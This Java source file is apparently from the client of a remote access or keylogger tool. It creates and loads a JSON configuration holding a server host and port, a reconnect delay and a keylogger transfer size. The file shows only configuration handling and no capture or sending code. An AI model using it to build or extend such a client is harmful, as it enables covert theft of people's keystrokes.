/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.ctx.client.configuration;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Reader;
import java.io.Writer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.logging.Level;
import java.util.logging.Logger;
import lombok.AccessLevel;
import lombok.Getter;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public final class JsonConfiguration 
{
    @Getter(AccessLevel.PUBLIC)
    static Config configuration;
    
    @Getter(AccessLevel.PUBLIC)
    final File configurationFile = new File("./config.json");
    
    /**
     * Constructor
     */
    public JsonConfiguration()
    {
        if (!configurationFile.exists()) 
        {
            try 
            {
                generateDefaultConfiguration(configurationFile.toPath());
            } 
            catch (IOException ex) 
            {
                Logger.getLogger(JsonConfiguration.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
    
    /**
     * Generate default JSON configuration file
     * 
     * @param path
     * @throws IOException 
     */
    private void generateDefaultConfiguration(Path path) throws IOException 
    {
        Config config = new Config.ConfigBuilder()
                .serverHost("127.0.0.1")
                .serverPort(1166)
                .reconnectDelay(15)
                .keyloggerTransferSize(800)
                .build();
        
        try (Writer writer = new FileWriter(path.toFile())) 
        {
            Gson gson = new GsonBuilder()
                    .excludeFieldsWithoutExposeAnnotation()
                    .setPrettyPrinting()
                    .create();
            gson.toJson(config, writer);
            log.debug("Saved default configuration file in: {}", path.toAbsolutePath());
        }
    }

    /**
     * Load JSON configuration file
     * 
     * @param path
     * @throws FileNotFoundException
     * @throws IOException 
     */
    public void loadConfiguration(Path path) throws FileNotFoundException, IOException 
    {
        Reader reader = Files.newBufferedReader(path);

        Gson gson = new GsonBuilder()
                .excludeFieldsWithoutExposeAnnotation()
                .create();

        configuration = gson.fromJson(reader, Config.class);
        log.info("Successfully loaded configuration: {} -> {}", path.toAbsolutePath(), configuration.toString());
    }
}
